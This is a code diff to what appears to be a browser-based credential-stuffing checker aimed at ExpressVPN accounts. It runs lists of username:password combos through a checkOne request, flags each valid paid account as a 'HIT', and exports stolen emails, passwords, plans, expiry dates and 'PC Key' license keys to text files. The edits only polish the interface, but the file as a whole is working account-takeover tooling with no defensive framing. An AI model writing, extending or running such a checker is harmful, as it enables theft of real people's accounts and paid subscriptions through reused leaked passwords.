+  // ===== ALL =====
   if (!results.length) {
-    allList.innerHTML = '<div class="empty"><span class="emo">📋</span>No results yet.</div>';
+    allList.innerHTML = `
+      <div class="empty">
+        <span class="emo">📋</span>
+        <div class="title">No results yet</div>
+        <div class="sub">Start checking to see results</div>
+      </div>`;
   } else {
     allList.innerHTML = results.map(r => {
       const cls = r.hit ? 'hit' : 'fail';
       return `<div class="mini-item ${cls}">
-        <span>${escapeHtml(r.username)}:${escapeHtml(r.password)}</span>
-        <span class="s ${cls}">${r.hit ? '🔥 HIT' : '❌ FAIL'}</span>
+        <span class="combo-text">${escapeHtml(r.username)}:${escapeHtml(r.password)}</span>
+        <span class="status-tag ${cls}">${r.hit ? '🔥 HIT' : '✗ FAIL'}</span>
       </div>`;
     }).join('');
   }
@@ -717,8 +1815,7 @@ async function checkOne(username, password) {
     }
     const json = await res.json();
     return {
-      username,
-      password,
+      username, password,
       valid: json.valid === true,
       hit: json.hit === true,
       plan: json.plan || null,
@@ -739,11 +1836,11 @@ async function runner() {
     running = false;
     startBtn.disabled = false;
     stopBtn.disabled = true;
-    setStatus('✅ Completed · ' + stats.hits + ' HIT(s)');
+    setStatus('✅ Completed · ' + stats.hits + ' HIT(s) found');
     return;
   }
   const c = combos[currentIdx];
-  setStatus(`🔍 ${currentIdx + 1}/${combos.length} · ${c.username}`);
+  setStatus(`🔍 Checking ${currentIdx + 1}/${combos.length} · ${c.username}`, true);
   const r = await checkOne(c.username, c.password);
   if (r === null) {
     running = false;
@@ -764,7 +1861,8 @@ async function runner() {
     running = false;
     startBtn.disabled = false;
     stopBtn.disabled = true;
-    setStatus('✅ Completed · ' + stats.hits + ' HIT(s)');
+    setStatus('✅ Completed · ' + stats.hits + ' HIT(s) found');
+    if (stats.hits > 0) showToast('🎉 ' + stats.hits + ' HIT(s) found!');
   }
 }
 
@@ -780,7 +1878,8 @@ startBtn.addEventListener('click', () => {
   running = true;
   startBtn.disabled = true;
   stopBtn.disabled = false;
-  setStatus('🚀 Starting...');
+  setStatus('🚀 Starting...', true);
+  showToast('🚀 Checking ' + combos.length + ' combos');
   runner();
 });
 
@@ -788,26 +1887,33 @@ stopBtn.addEventListener('click', () => {
   running = false;
   startBtn.disabled = false;
   stopBtn.disabled = true;
-  setStatus('⏸️ Stopped');
+  setStatus('⏸️ Stopped by user');
 });
 
 exportHitsBtn.addEventListener('click', () => {
   const h = results.filter(r => r.hit);
-  if (!h.length) return showToast('❌ No hits');
+  if (!h.length) return showToast('❌ No hits to export');
   const txt = h.map(x =>
-    `📧 Email: ${x.username}\n🔑 Password: ${x.password}\n📋 Plan: ${x.plan || '—'}\n📅 Expiry: ${x.expiry || '—'}\n🔑 PC Key: ${x.pcKey || '—'}\n📅 Key Expiry: ${x.keyExpire || '—'}\n📌 Status: ${x.keyStatus || '—'}\n---`
+    `📧 Email: ${x.username}\n` +
+    `🔑 Password: ${x.password}\n` +
+    `📋 Plan: ${x.plan || '—'}\n` +
+    `📅 Expiry: ${x.expiry || '—'}\n` +
+    `🗝️ PC Key: ${x.pcKey || '—'}\n` +
+    `📅 Key Expiry: ${x.keyExpire || '—'}\n` +
+    `📌 Status: ${x.keyStatus || '—'}\n` +
+    `----------------------------------------`
   ).join('\n\n');
   dl(txt, 'expressvpn_hits.txt');
-  showToast('📥 ' + h.length + ' hit(s)');
+  showToast('📥 Exported ' + h.length + ' hit(s)');
 });
 
 exportAllBtn.addEventListener('click', () => {
-  if (!results.length) return showToast('❌ Empty');
+  if (!results.length) return showToast('❌ Nothing to export');
   const txt = results.map(r =>
     `[${r.hit ? 'HIT' : 'FAIL'}] ${r.username}:${r.password} | ${r.plan || '—'} | ${r.expiry || '—'}`
   ).join('\n');
   dl(txt, 'expressvpn_all.txt');
-  showToast('📄 Exported');
+  showToast('📄 Exported ' + results.length + ' result(s)');
 });
 
 function dl(text, name) {
@@ -823,7 +1929,7 @@ function dl(text, name) {
 }
 
 // ============================================================
-//  Init
+//  INIT
 // ============================================================
 (async () => {
   updateStats();
